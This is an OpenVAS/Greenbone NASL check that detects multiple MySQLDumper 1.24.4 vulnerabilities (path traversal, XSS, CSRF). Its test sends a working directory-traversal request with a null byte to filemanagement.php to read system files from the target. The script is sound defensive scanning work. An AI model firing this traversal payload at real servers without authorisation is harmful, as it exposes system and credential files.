# Copyright (C) 2012 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:mysqldumper:mysqldumper";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902675");
  script_version("2022-04-27T12:01:52+0000");
  script_cve_id("CVE-2012-4251", "CVE-2012-4252", "CVE-2012-4253",
                "CVE-2012-4254", "CVE-2012-4255");
  script_tag(name:"cvss_base", value:"5.1");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2022-04-27 12:01:52 +0000 (Wed, 27 Apr 2022)");
  script_tag(name:"creation_date", value:"2012-04-30 15:02:29 +0530 (Mon, 30 Apr 2012)");
  script_name("MySQLDumper Multiple Vulnerabilities");

  script_xref(name:"URL", value:"http://1337day.com/exploits/18146");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/53306");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/75283");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/75284");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/75285");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/75286");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/75287");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/112304/MySQLDumper-1.24.4-LFI-XSS-CSRF-Code-Execution-Traversal.html");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("sw_mysqldumper_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("mysqldumper/installed");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute
  arbitrary script code in the context of the affected site, steal cookie based
  authentication credentials, gain sensitive information or upload arbitrary
  code.");
  script_tag(name:"affected", value:"MySQLDumper version 1.24.4");
  script_tag(name:"insight", value:"The flaws are due to

  - Input passed via the 'language' parameter to signin.php and 'action'
  parameter to filemanagement.php script is not properly verified before
  being used, which allows attackers to read arbitrary files via a
  ../(dot dot) sequences.

  - Improper validation of user-supplied input passed via the 'phase' parameter
  to install.php, 'page' parameter to index.php, 'bid' parameter to sql.php
  and 'filename' parameter to restore.php, which allows attackers to execute
  arbitrary HTML and script code.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"MySQLDumper is prone to multiple vulnerabilities.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("os_func.inc");
include("http_keepalive.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

if( dir == "/" ) dir = "";

files = traversal_files();

foreach file ( keys( files ) ) {

  url = dir + "/filemanagement.php?action=dl&f=" +
        crap( data:"../", length:3*15 ) + files[file] + "%00";

  if( http_vuln_check( port:port, url:url, pattern:file, check_header:TRUE ) ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
